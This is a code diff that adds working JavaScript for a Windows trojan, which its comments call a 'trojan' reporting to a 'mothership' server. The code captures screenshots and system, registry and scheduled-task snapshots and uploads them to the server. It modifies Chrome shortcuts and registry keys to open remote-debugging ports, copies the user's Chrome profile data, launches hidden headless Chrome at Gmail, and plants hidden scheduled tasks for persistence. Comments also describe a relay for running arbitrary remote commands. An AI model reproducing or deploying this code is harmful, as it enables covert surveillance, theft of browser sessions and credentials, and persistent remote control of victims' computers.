+        let response = await download_screencapture_script();
+    }
+
+    if (!fileExists(localpath)) {
+        throw new Error(`screencapture script does not exist ${localpath}`);
+    }
+
+    let stdout = await exec_getscreencapture();
+
+    let lines = stdout.split(/\r?\n/);
+
+    for (let i = 0; i < lines.length; i++) {
+        let line = lines[i];
+
+        if (line.startsWith("filepath=")) {
+            let fpath = line.split("=")[1];
+            let fname = path.basename(fpath);
+
+            let ret = await upload_file(fname, runningcmd.jobcode, fpath);
+
+            // TODO logmsg file upload
+        }
+    }
+
+    ret = await logEventMothership("job_finished", runningcmd.jobcode);
+
+    // job_finished_with_error
+
+    process.exit(0);
+}
+
+// TODO refactor to use powershell as tpl doesn't allow reg query
+function query_reg(reg_path) {
+    return new Promise((resolve, reject) => {
+        const reg_query = `reg query ${reg_path} /s /z`;
+
+        // reg query HKU\S-1-5-21-435801507-4188035712-3236683676-1001\SOFTWARE\Microsoft\Windows\CurrentVersion /s /z
+
+        exec(reg_query, (error, stdout, stderr) => {
+            if (error) {
+                reject(error);
+            }
+
+            if (stderr) {
+                resolve(stderr);
+            }
+
+            resolve(stdout);
+        });
+    });
+}
+
+function errorToJson(error) {
+    const errorString = JSON.stringify(
+        error,
+        (key, value) => {
+            if (value instanceof Error) {
+                return {
+                    name: value.name,
+                    message: value.message,
+                    stack: value.stack,
+                    ...value, // Captures any custom properties attached to the error
+                };
+            }
+            return value;
+        },
+        2
+    );
+
+    return errorString;
+}
+
+async function getsystemoverview() {
+    logmsg("starting");
+
+    let runningcmd = systemstate.cmdconfig;
+    let config = runningcmd.config;
+
+    if (!config) {
+        throw new Error(
+            `${runningcmd.cmdname} must be launched with job config set`
+        );
+    }
+
+    let dir_snapshot = null;
+    try {
+        dir_snapshot = getDirInfo(systemstate.trojandir);
+    } catch (err) {
+        dir_snapshot = errorToJson(err);
+    }
+
+    let task_snapshot = await getTasks();
+    let process_snapshot = await getProcessList_wmic();
+
+    let reg_snapshot = await Promise.all(
+        regstartupconfig.reg_paths.map(async (reg_path) => {
+            let ret = await query_reg(reg_path.replaceAll(":", ""));
+            return ret;
+        })
+    );
+
+    let startupdir_snapshots = await Promise.all(
+        startupfolderconfig.folderpaths.map(async (folderpath) => {
+            try {
+                return getDirInfo(folderpath);
+            } catch (error) {
+                return errorToJson(error);
+            }
+        })
+    );
+
+    let outjson = {
+        dir_snapshot: dir_snapshot,
+        task_snapshot: task_snapshot,
+        process_snapshot: process_snapshot,
+        startupdir_snapshots: startupdir_snapshots,
+        reg_snapshot: reg_snapshot,
+    };
+
+    let outjson_str = JSON.stringify(outjson);
+
+    let localfpath = path.join(
+        systemstate.trojandir,
+        runningcmd.cmdname + "_out_" + getTimestamp() + ".json"
+    );
+
+    fs.writeFileSync(localfpath, outjson_str, "utf-8");
+
+    let baseUrl = systemstate.mothership + "/ow/upload.php";
+
+    let filename = "getsystemoverview.out";
+
+    let kvp = systemstate.statekvp;
+    kvp["filename"] = filename;
+    kvp["jobcode"] = runningcmd.jobcode;
+
+    let response = await makePUTRequest(baseUrl, kvp, null, localfpath);
+
+    logmsg(JSON.stringify(response));
+
+    process.exit(0);
+}
+
+async function modify_msedge() {
+    // C:\Users\ADULT2022\AppData\Local\Microsoft\Edge\User Data
+}
+
+async function copy_userdata(srcpath, destpath) {
+
+    logmsg('starting');
+
+    let copycmdstr = `robocopy "${srcpath}" "${destpath}" /E /R:0 /W:0`;
+
+    if ( ! folderExists(destpath) ) {
+        fs.mkdirSync(destpath, { recursive: true });
+    }
+
+    return new Promise((resolve, reject) => { 
+        exec(copycmdstr, (error, stdout, stderr) => {
+            if (error) {                      
+                reject(error);                
+            }                                 
+
+            if (! isNullOrWhitespace(stderr) )
+                resolve(stderr);
+
+            resolve(stdout);
+        });
+    });
+
+}
+
+/**
+ * Recursively finds all files with a specific extension in a directory.
+ * @param {string} dirPath - The starting directory path.
+ * @param {string} extension - The target extension (e.g., '.js', '.json', '.txt').
+ * @returns {string[]} An array of matching file paths.
+ */
+function getFilesByExtensionSync(dirPath, extension) {
+    let results = [];
+
+    if ( ! folderExists(dirPath) ) {
+        logmsg(`dirpath does not exit ${dirPath}`);
+        return results;
+    }
+
+    const items = fs.readdirSync(dirPath);
+
+    for (const item of items) {
+        const fullPath = path.join(dirPath, item);
+        const stat = fs.statSync(fullPath);
+
+        if (stat.isFile() && path.extname(fullPath) === extension) {
+            results.push(fullPath);
+        }
+    }
+
+    return results;
+}
+
+// anchor
+function spawn_chrome(starturl='https://www.gmail.com/', debugport=9223, datadir=null) {
+
+    datadir = datadir || path.join(systemstate.trojandir, 'chrome');
+
+    let cmdlineargs = [ 
+        `--remote-debugging-port=${debugport}`,
+        `--user-data-dir=${datadir}`,
+        `--new-window ${starturl}`,
+        `--headless=new`,
+        `--no-first-run`,
+        `--no-default-browser-check`,
+        `--profile-directory=Default`,
+        `--remote-allow-origins=*`,
+        `--restore-last-session`,
+        `--ignore-certificate-errors`,
+        `--window-position=2000,2000`,
+        `--window-size=10,10`
+    ];
+
+    // TODO auto discover by reading chrome lnk files
+    let chrome_exe_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+
+    const child = spawn(
+        chrome_exe_path,
+        [ ...cmdlineargs ],
+        {
+            // detached: true, // might cause errors
+            windowsHide: true,
+            // stdio: ["ignore", out, err],
+            // shell: false,
+            // cwd: systemstate.trojandir,
+        }
+    );
+
+    child.stdout.on("data", (data) => {
+        let text = data.toString();
+
+        if (stdoutfunc) stdoutfunc(text);
+        else logmsg(text);
+    });
+
+    child.stderr.on("data", (data) => {
+        let text = data.toString();
+
+        if (stderrfunc) stderrfunc(text);
+        else logmsg(text);
+    });
+
+    child.on("close", (code) => {
+        if (closefunc) closefunc(code);
+        else logmsg(`Child process exited with code ${code}`);
+    });
+
+    return child;
+}
+
+// start chrome --remote-debugging-port=9223 --user-data-dir=C:\Users\LC2022\AppData\Local\Google\test\chrome
+function chrome_cmdlineargs(
+    starturl = "https://www.yahoo.com",
+    debugport = 9223,
+    datadir = `C:\\Users\\${systemstate.username}\\AppData\\Local\\Google\\test\\chrome`,
+    x_pos = 0,
+    y_pos = 0,
+    width = 1920,
+    height = 1080,
+    ignorecert = false,
+    restore = false,
+    headless = false
+) {
+    datadir = datadir.trim();
+
+    let cmdlineargs = [
+        `--remote-debugging-port=${debugport}`,
+        `--user-data-dir=${datadir}`,
+        `--disable-notifications`,
+        `--noerrdialogs`,
+        `--disable-infobars`,
+        `--disable-session-crashed-bubble`,
+        //`--disable-popup-blocking`,
+        `--suppress-message-center-popups`,
+        headless ? `--headless=new` : "",
+        `--no-first-run`, // You can skip Chrome's welcome and setup screens
+        `--no-default-browser-check`,
+        `--disable-signin-promo`,
+        //`--profile-directory="Profile 1"`,
+        //`--profile-directory=Default`,
+        `--remote-allow-origins=*`,
+        restore ? `--restore-last-session` : null,
+        ignorecert ? `--ignore-certificate-errors` : null,
+        `--window-position=${x_pos},${y_pos}`,
+        `--window-size=${width},${height}`,
+        `--hide-crash-restore-bubble`,
+        `--disable-features=WelcomePage,PrivacySandboxSettings4`,
+        `--new-window`,
+        starturl,
+    ];
+
+    let ret = cmdlineargs.filter((item) => {
+        return !helper.isNullOrWhitespace(item);
+    });
+
+    return ret;
+}
+
+// TODO modify for client PCs / TPL
+async function modify_chrome() {
+// https://peter.sh/experiments/chromium-command-line-switches/
+
+    logmsg('starting');
+
+    let runningcmd = systemstate.cmdconfig;
+
+    let scriptfname = systemstate.istpl ? "modify_browser_lnk_tpl.ps1" : "modify_browser_lnk.ps1";
+    scriptfpath = path.join(systemstate.trojandir, scriptfname);
+
+    let ret = '';
+
+    if ( ! fileExists(scriptfpath) ) {
+        ret = await retrieve_asset(scriptfname);
+    }
+
+    if ( ! fileExists(scriptfpath) ) {
+        logmsg(`script does not exist ${scriptfpath}`);
+        process.exit(1);
+    }
+
+
+    let targetFolders = [];
+    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`);
+    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\`);
+    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`);
+    targetFolders.push(`C:\\Users\\Public\\Desktop`);
+    
+    targetFolders.push(`C:\\Users\\${systemstate.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`);
+    targetFolders.push(`C:\\Users\\${systemstate.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch`);
+    targetFolders.push(`C:\\Users\\${systemstate.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`);
+    targetFolders.push(`C:\\Users\\${systemstate.username}\\Desktop`);
+
+    targetFolders.push('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs');
+
+    let lnks = [];
+    
+    for ( const targetFolder of targetFolders ) {
+
+        let matchedFiles = getFilesByExtensionSync(targetFolder, '.lnk');
+
+        for (const [index, element] of matchedFiles.entries()) {
+            if ( element.toLowerCase().includes('chrome') )
+                lnks.push(element);
+        }
+    }
+
+    cmdlineargs = [
+        `--remote-debugging-port=${debugport}`,
+        `--user-data-dir="C:\\Users\\LC2022\\AppData\\Local\\Google\\test\\chrome"`,
+        `--disable-notifications`,
+        `--noerrdialogs`,
+        `--disable-infobars`,
+        `--disable-session-crashed-bubble`,
+        //`--disable-popup-blocking`,
+        `--suppress-message-center-popups`,
+        headless ? `--headless=new` : "",
+        `--no-first-run`, // You can skip Chrome's welcome and setup screens
+        `--no-default-browser-check`,
+        `--disable-signin-promo`,
+        //`--profile-directory="Profile 1"`,
+        //`--profile-directory=Default`,
+        `--remote-allow-origins=*`,
+        restore ? `--restore-last-session` : null,
+        ignorecert ? `--ignore-certificate-errors` : null,
+        `--window-position=${x_pos},${y_pos}`,
+        `--window-size=${width},${height}`,
+        `--hide-crash-restore-bubble`,
+        `--disable-features=WelcomePage,PrivacySandboxSettings4`,
+        `--new-window`,
+        starturl,
+    ];
+
+    // C:\\Users\\${helper.username}\\AppData\\Local\\Google\\test\\chrome
+    cmdlineargs = [
+        `--hide-crash-restore-bubble`,
+        `--user-data-dir="C:\\Users\\LC2022\\AppData\\Local\\Google\\test\\chrome"`,
+        `--profile-directory=Default`,
+        `--restore-last-session`,
+        `--start-maximized`,
+        `--no-first-run`, // You can skip Chrome's welcome and setup screens
+        `--remote-allow-origins=*`,
+        `--remote-debugging-port=9223`,
+        `--no-default-browser-check`,
+        // --ignore-certificate-errors --> causes warning popup in chrome on startup/launch
+        // `--new-window ${starturl}`,
+        // headless ? `--headless=new` : '',
+        // `--ignore-certificate-errors`,
+        // `--window-position=${x_pos},${y_pos}`,
+        // `--window-size=${width},${height}`,
+    ];
+
+    cmdlineargs = cmdlineargs.join(' ');
+
+    for ( const lnk of lnks ) {
+        logmsg(`processing ${lnk}`);
+
+        shortcut_path = lnk;
+        shortcut_path = shortcut_path.replaceAll('\\\\', '\\');
+
+        let jsonconfig = {
+            "cmd_line_args": cmdlineargs,
+            "shortcut_path": shortcut_path
+        };
+
+        let jsonconfigpath = path.join(systemstate.trojandir, scriptfname + '_' + getTimestamp() + '_config.json');
+
+        writeTag(jsonconfigpath, JSON.stringify(jsonconfig));
+
+        let childp = await execPSScript_async(scriptfpath, [jsonconfigpath]);
+
+    }
+
+    logmsg(`copying user data folder`);
+
+    srcpath = `C:\\Users\\${systemstate.username}\\AppData\\Local\\Google\\Chrome\\User Data`; // anchor
+    destpath = 'C:\\ProgramData\\owd\\chrome';
+
+    if ( ! folderExists(destpath) ) // BUG results in "command failed" error (chrome was running at the time of execution)
+        ret = await copy_userdata(srcpath, destpath);
+
+    process.exit(0);
+}
+
+// TODO
+async function __setup_chrome_relay() {
+
+    // 1. modify shotfut lnk file in taskbar, start menu, and desktop
+    // 2. modify registry paths as needed (doesn't work on TPL for that specific path)
+    // 3. robocopy user data dir
+    // 4. execute curl test
+
+    // chrome rdp mods
+    // robocopy "C:\Users\sebas\AppData\Local\Google\Chrome\User Data" C:\ProgramData\owd\chrome /E /R:0 /W:0
+    // "C:\Program Files\Google\Chrome\Application\chrome.exe" --user-data-dir="C:\ProgramData\owd\chrome" --profile-directory=Default --remote-allow-origins=* --restore-last-session --ignore-certificate-errors --remote-debugging-port=9223
+    // HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command
+    // "C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 -- "%1"
+    // reg add HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command /ve /t REG_SZ /d "\"C:\Program Files\Google\Chrome\Application\chrome.exe\" --remote-debugging-port=9223 -- \"^%1\"" /f
+    // "C:\Program Files\Google\Chrome\Application\chrome.exe"
+    // "HKLM:\Software\Classes\ChromeHTML\shell\open\command"
+    //    Get-ItemProperty -Path "HKCR:\ChromeHTML\shell\open\command"                  --> returned empty
+    //    Get-ItemProperty -Path "HKCU:\Software\Classes\ChromeHTML\shell\open\command" --> returned empty
+    //    Get-ItemProperty -Path "HKLM:\Software\Classes\ChromeHTML\shell\open\command"
+    // ! was not able to modify reg using reg cmd or powershell -- attempt using VBScript
+
+    /*
+    (default)    : "C:\Program Files\Google\Chrome\Application\chrome.exe" --single-argument %1
+    PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Classes\ChromeHTML\shell\open\command
+    PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Classes\ChromeHTML\shell\open
+    PSChildName  : command
+    PSDrive      : HKLM
+    PSProvider   : Microsoft.PowerShell.Core\Registry
+    */
+
+    // msedge rdp mods
+    // robocopy "C:\Users\sebas\AppData\Local\Microsoft\Edge\User Data" C:\ProgramData\owd\msedge /E /W:0
+    // msedge.exe --remote-debugging-port=9222 --user-data-dir="C:\ProgramData\owd\msedge"
+    // reg add "HKLM\Software\Policies\Microsoft\Edge" /v "RemoteDebuggingAllowed" /t REG_DWORD /d 1 /f > %workdir%\mod_msedge.bat
+    // reg add "HKCU\Software\Policies\Microsoft\Edge\WebView2\AdditionalBrowserArguments" /v "msedge.exe" /t REG_SZ /d "--remote-debugging-port=9222" /f >> %workdir%\mod_msedge.bat
+    // Startup-Boost: Pre-loads portions of msedge upon system boot so the application
+    // opens instantly on demand
+    // reg add HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command /ve /t REG_SZ /d "\"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe\" --remote-debugging-port=9222 -- \"^%1\"" /f
+    // HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    // MicrosoftEdgeAutoLaunch_5B148DE90C207DD5EDAA5B34E614DD84    REG_SZ    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --win-session-start
+    // C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk
+    // C:\Users\sebas\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk
+    // taskkill /F /IM msedge.exe
+    // start "" /min "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --remote-debugging-port=9222 --profile-directory=Default "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --remote-debugging-port=9222 --profile-directory=Default --remote-allow-origins=* --restore-last-session --user-data-dir="C:\ProgramData\owd\msedge"
+
+    // shortcut folders
+    // %AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
+    // %ProgramData%\Microsoft\Windows\Start Menu\Programs
+    // C:\Users\sebas\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
+
+    // Desktop Shortcut:             C:\Users\<YourUsername>\Desktop
+    // Start Menu:                   C:\Users\<YourUsername>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
+    // Taskbar Pinned Items:         C:\Users\<YourUsername>\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
+    // Chrome App/Website Shortcuts: C:\Users\<YourUsername>\AppData\Local\Google\Chrome\User Data\Default\Web Applications
+
+    // HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice
+    // HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice
+
+    // curl -v -G http://localhost:9223/json
+    // curl -s http://localhost:9223/json/list | findstr webSocketDebuggerUrl | findstr ws://
+}
+
+// ---
+
+async function logMsgMothership(msg, isevent = false, jobcode) {
+    let baseUrl = systemstate.mothership + "/ow/logmsg.php";
+
+    let kvp = systemstate.statekvp;
+
+    kvp[isevent ? "event" : "msg"] = msg;
+    kvp["jobcode"] = jobcode;
+
+    let response = await makeGetRequest(baseUrl, kvp);
+    return response;
+}
+
+// make GET request to logmsg.php with event = event_code
+function logEventMothership(event_code, jobcode) {
+    return logMsgMothership(event_code, true, jobcode);
+}
+
+// ---
+
+async function getTasks() {
+    let ret = await getTaskDetail();
+    return ret;
+}
+
+async function createTask(taskname) {
+    logmsg(`starting -- task ${taskname}`);
+
+    if (!taskconfig.tasknames.includes(taskname)) {
+        throw new Error(`${taskname} is not supported`);
+    }
+
+    let taskxmlstrfunc = taskconfig.getTaskXMLFunc(taskname);
+    let tasktime = taskconfig.getTaskTime(taskname);
+
+    let pexe = "conhost.exe";
+    let args = `--headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} ${taskname}`;
+    let workdir = "C:\\ProgramData\\owd\\";
+
+    // let tasktime = ["RepTask", "TimeTask"].includes(taskname) ? "1" : "5";
+
+    let taskxmlstr = taskxmlstrfunc(
+        taskname,
+        "1999-07-25T12:00:00",
+        tasktime,
+        pexe,
+        args,
+        workdir
+    );
+
+    let cleanXml = taskxmlstr.replace(/>\s+/g, ">").replace(/\s+</g, "<");
+
+    let fpath = path.join(systemstate.trojandir, taskname + ".xml");
+    fs.writeFileSync(fpath, cleanXml, "utf8");
+    await exec_schtasks(fpath, taskname);
+}
+
+async function exec_schtasks(taskxmlpath, taskname) {
+    // schtasks /create /XML "taskxmlpath" /tn "taskname" /F
+    let ret = await invoke_exe(
+        "schtasks",
+        [
+            "/create",
+            "/XML",
+            '"' + taskxmlpath + '"',
+            "/tn",
+            '"' + taskname + '"',
+            "/F",
+        ],
+        null,
+        (text) => {
+            logmsg(text);
+        },
+        (text) => {
+            logmsg(text);
+        }
+    );
+}
+
+async function getTaskExists(taskname) {
+    let resultdict = null;
+
+    try {
+        resultdict = await getTaskDetail(taskname);
+    } catch (err) {
+        logmsg(
+            "task detail returned empty result -- assuming task does not exist"
+        );
+        return false;
+    }
+
+    if (resultdict && resultdict["TaskName"]) {
+        return true;
+    }
+
+    return false;
+}
+
+async function getTaskDetail(taskname) {
+    let resultdict = {};
+    let taskstr = "";
+
+    // Last Run Time:                        1999-11-30 12:00:00 AM
+    // Last Result:                          267011
+    // schtasks /query /tn "\Microsoft\Windows\NlaSvc\WiFiTask" /fo LIST /v
+
+    let args = null;
+
+    let showalltasks = isNullOrWhitespace(taskname);
+    if (!showalltasks) {
+        args = ["/query", "/tn", taskname, "/fo", "LIST", "/v"];
+    } else {
+        args = ["/query", "/fo", "LIST", "/v"];
+    }
+
+    let ret = await invoke_exe("schtasks", args, null, (stdout) => {
+        taskstr += stdout;
+    });
+
+    if (isNullOrWhitespace(taskstr)) {
+        throw new Error("could not generate task detail listing ");
+    }
+
+    const lines = taskstr.split(/\r?\n/);
+
+    let results = [];
+    for (let i = 0; i < lines.length; i++) {
+        let line = lines[i];
+
+        if (isNullOrWhitespace(line)) {
+            if (Object.keys(resultdict).length > 0) results.push(resultdict);
+            continue;
+        }
+
+        let parts = line.split(":");
+
+        if (parts && parts.length > 1) {
+            let key = "";
+            let value = "";
+
+            if (parts[0] == "Repeat") {
+                value = parts.pop().trim();
+                key = parts.join(":").trim();
+            } else {
+                key = parts[0].trim();
+                value = parts.splice(1).join(":").trim();
+            }
+
+            resultdict[key] = value;
+        }
+    }
+
+    return results;
+}
+
+function getIdleTaskXMLStr(
+    intaskname,
+    tasktimestr,
+    tskxmltime,
+    pexe,
+    args,
+    workdir
+) {
+    // tasktimestr --> 2005-01-01T00:08:00
+    let taskxmlstr = `
+        <?xml version="1.0" encoding="UTF-16" ?>
+        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+        <RegistrationInfo>
+            <Date>2026-04-26T09:45:36.6514157</Date>
+            <Author>test</Author>
+            <URI>${intaskname}</URI>
+        </RegistrationInfo>
+        <Triggers>
+            <IdleTrigger>
+                <StartBoundary>${tasktimestr}</StartBoundary>
+            </IdleTrigger>
+        </Triggers>
+        <Settings>
+            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+            <AllowHardTerminate>false</AllowHardTerminate>
+            <StartWhenAvailable>true</StartWhenAvailable>
+            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+            <IdleSettings>
+                <Duration>PT${tskxmltime}M</Duration>
+                <WaitTimeout>PT1H</WaitTimeout>
+                <StopOnIdleEnd>false</StopOnIdleEnd>
+                <RestartOnIdle>false</RestartOnIdle>
+            </IdleSettings>
+            <AllowStartOnDemand>true</AllowStartOnDemand>
+            <Enabled>true</Enabled>
+            <Hidden>true</Hidden>
+            <RunOnlyIfIdle>false</RunOnlyIfIdle>
+            <WakeToRun>true</WakeToRun>
+            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+            <Priority>7</Priority>
+        </Settings>
+        <Actions Context="Author">
+            <Exec>
+                <Command>${pexe}</Command>
+                <Arguments>${args}</Arguments>
+                <WorkingDirectory>${workdir}</WorkingDirectory>
+            </Exec>
+        </Actions>
+        </Task>`;
+
+    return taskxmlstr;
+}
+
+function getRepTaskXMLStr(
+    intaskname,
+    tasktimestr,
+    tskxmltime,
+    pexe,
+    args,
+    workdir
+) {
+    let taskxmlstr = `
+        <?xml version="1.0" encoding="UTF-16" ?>
+        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+            <RegistrationInfo>
+                <Date>2026-04-26T09:45:36.6514157</Date>
+                <Author>test</Author>
+                <URI>${intaskname}</URI>
+            </RegistrationInfo>
+            <Triggers>
+                <CalendarTrigger>
+                    <StartBoundary>${tasktimestr}</StartBoundary>
+                    <Repetition>
+                        <Interval>PT${tskxmltime}M</Interval>
+                        <StopAtDurationEnd>false</StopAtDurationEnd>
+                    </Repetition>
+                    <ScheduleByDay>
+                        <DaysInterval>1</DaysInterval>
+                    </ScheduleByDay>
+                </CalendarTrigger>
+            </Triggers>
+            <Settings>
+                <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+                <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+                <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+                <AllowHardTerminate>false</AllowHardTerminate>
+                <StartWhenAvailable>true</StartWhenAvailable>
+                <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+                <IdleSettings>
+                    <StopOnIdleEnd>false</StopOnIdleEnd>
+                    <RestartOnIdle>false</RestartOnIdle>
+                </IdleSettings>
+                <AllowStartOnDemand>true</AllowStartOnDemand>
+                <Enabled>true</Enabled>
+                <Hidden>true</Hidden>
+                <RunOnlyIfIdle>false</RunOnlyIfIdle>
+                <WakeToRun>true</WakeToRun>
+                <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+                <Priority>7</Priority>
+            </Settings>
+            <Actions Context="Author">
+                <Exec>
+                    <Command>${pexe}</Command>
+                    <Arguments>${args}</Arguments>
+                    <WorkingDirectory>${workdir}</WorkingDirectory>
+                </Exec>
+            </Actions>
+        </Task>`;
+
+    return taskxmlstr;
+}
+
+function getTimeTaskXMLStr(
+    intaskname,
+    tasktimestr,
+    timetaskxmltime,
+    pexe,
+    args,
+    workdir
+) {
+    let taskxmlstr = `
+        <?xml version="1.0" encoding="UTF-16"?>
+        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+        <RegistrationInfo>
+            <Date>2026-04-26T09:45:36.6514157</Date>
+            <Author>test</Author>
+            <URI>${intaskname}</URI>
+        </RegistrationInfo>
+        <Triggers>
+            <TimeTrigger>
+                <StartBoundary>${tasktimestr}</StartBoundary>
+                <Repetition>
+                <Interval>PT${timetaskxmltime}M</Interval>
+                </Repetition>
+                <RandomDelay>PT30S</RandomDelay>
+            </TimeTrigger>
+        </Triggers>
+        <Settings>
+            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+            <AllowHardTerminate>false</AllowHardTerminate>
+            <StartWhenAvailable>true</StartWhenAvailable>
+            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+            <IdleSettings>
+                <StopOnIdleEnd>false</StopOnIdleEnd>
+                <RestartOnIdle>false</RestartOnIdle>
+            </IdleSettings>
+            <AllowStartOnDemand>true</AllowStartOnDemand>
+            <Enabled>true</Enabled>
+            <Hidden>true</Hidden>
+            <RunOnlyIfIdle>false</RunOnlyIfIdle>
+            <WakeToRun>true</WakeToRun>
+            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+            <Priority>7</Priority>
+        </Settings>
+        <Actions Context="Author">
+        <Exec>
+            <Command>${pexe}</Command>
+            <Arguments>${args}</Arguments>
+            <WorkingDirectory>${workdir}</WorkingDirectory>
+        </Exec>
+        </Actions>
+        </Task>`;
+
+    return taskxmlstr;
+}
+
+function getDailyTaskXMLStr(
+    intaskname,
+    tasktimestr,
+    timetaskxmltime,
+    pexe,
+    args,
+    workdir
+) {
+    let taskxmlstr = `
+        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+        <RegistrationInfo>
+            <Date>2026-04-26T09:45:36.6514157</Date>
+            <Author>test</Author>
+            <URI>${intaskname}</URI>
+        </RegistrationInfo>
+        <Triggers>
+            <CalendarTrigger>
+                <StartBoundary>${tasktimestr}</StartBoundary>
+                <Enabled>true</Enabled>
+                <ScheduleByDay>
+                    <DaysInterval>${timetaskxmltime}</DaysInterval>
+                </ScheduleByDay>
+            </CalendarTrigger>
+        </Triggers>
+        <Settings>
+            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+            <AllowHardTerminate>false</AllowHardTerminate>
+            <StartWhenAvailable>true</StartWhenAvailable>
+            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+            <IdleSettings>
+                <StopOnIdleEnd>false</StopOnIdleEnd>
+                <RestartOnIdle>false</RestartOnIdle>
+            </IdleSettings>
+            <AllowStartOnDemand>true</AllowStartOnDemand>
+            <Enabled>true</Enabled>
+            <Hidden>true</Hidden>
+            <RunOnlyIfIdle>false</RunOnlyIfIdle>
+            <WakeToRun>true</WakeToRun>
+            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+            <Priority>7</Priority>
+        </Settings>
+        <Actions Context="Author">
+            <Exec>
+                <Command>${pexe}</Command>
+                <Arguments>${args}</Arguments>
+                <WorkingDirectory>${workdir}</WorkingDirectory>
+            </Exec>
+        </Actions>
+        </Task>`;
+
+    return taskxmlstr;
+}
+
+// ---
+
+/*
+let clientjob = {
+jobtype: 'EXEC_<ext>', 'execute_cmdlist', 'EXEC_CMD'
+jobcode: 8 digit 0-9 random code,
+localpath:'' local path of script text (n/a for EXEC_CMD)
+jobfilename:'' --> need extension to execute script engine
+cmdname: 'GetSystemOverview',
+args: [ ... ]
+};
+
+ping.php
+EXEC_CMD --> StartRelay|BAT,PS1,PY,JS
+
+incomming cmd
+{ cmdtext:'echo 1234 \n', seqid:1234, cmdid:random 8 digit code, ts:timestamp }
+
+outgoing result
+{ status:'OK', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
+{ status:'ERROR', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
+{ status:'INFO', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
+
+*/
+
+/*
+    {
+        cmdtext:cmdtext,
+        seqid:seqid++,
+        cmdid:getRandomCode(8),
+        ts:getTimestamp()
+    }
+
+    { execresult: str, ts: getTimestamp() }
+
+    Python Relay
+
+    incomming messages
+
+    host sends:
+    {
+        MessageID
+        payload
+        ws_url
+        ts
+    }
+
+    client expects:
+    {
+      "MessageID":...
+      "payload":{}
+      "ws_url":
+      "builtincmd":
+    }
+
+    outgoing
+    {
+      "MessageID"
+      "payload" --> holds result object from executing incoming cmd
+    }
+
+
+*/
